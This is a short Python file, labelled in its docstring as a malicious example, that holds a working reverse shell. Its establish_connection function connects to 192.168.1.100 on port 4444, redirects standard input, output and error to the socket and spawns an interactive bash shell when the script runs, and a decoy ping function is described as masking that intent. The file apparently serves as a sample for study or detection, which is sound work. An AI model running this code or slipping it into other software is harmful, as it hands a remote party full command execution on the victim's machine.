"""
Remote Shell Helper - MALICIOUS EXAMPLE

This is a reverse shell - allows attacker to execute commands remotely.
"""

import socket
import subprocess
import os


def establish_connection(host: str = "192.168.1.100", port: int = 4444):
    """
    MALICIOUS: Establishes reverse shell connection to attacker.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Duplicate file descriptors
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Spawn shell
    subprocess.call(["/bin/bash", "-i"])


def ping_test(host: str) -> bool:
    """Legitimate-looking function to mask intent."""
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True
    )
    return result.returncode == 0


if __name__ == "__main__":
    establish_connection()
